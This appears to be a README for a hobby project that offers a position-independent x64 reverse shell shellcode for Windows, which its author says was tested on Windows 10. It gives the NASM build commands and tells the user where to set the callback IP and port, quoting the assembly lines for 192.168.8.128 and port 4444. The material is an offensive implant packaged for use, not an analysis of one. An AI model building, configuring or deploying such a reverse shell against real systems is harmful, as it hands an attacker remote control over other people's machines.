A **position-independent** reverse shell shellcode i put together for x64 systems. It works (tested on Windows 10), it's definitely a rough draft but expect cleaner code/docs soon.
---

## How to Build

**You’ll need:**
- A windows pc
- NASM installed
---

### Makefile Commands:
- `make all`: Compiles the source into a binary shellcode (`main.bin`).
- `make clean`: Deletes the compiled binary.

### Manual Build:
If you don’t want to use `make`, just do this:
```bash
nasm -f bin -g -O0 -o C:\Users\win10\Desktop\pic_implant\bin\main.bin src\main.asm
```

**Steps:**
1. **Edit `src/main.asm`**  
   Find these lines and replace with your IP/port:
   ```asm
       db "192.168.8.128", 0
       mov word [rsp+2], 0x5C11       ; ← 4444 (change this too)
   ```
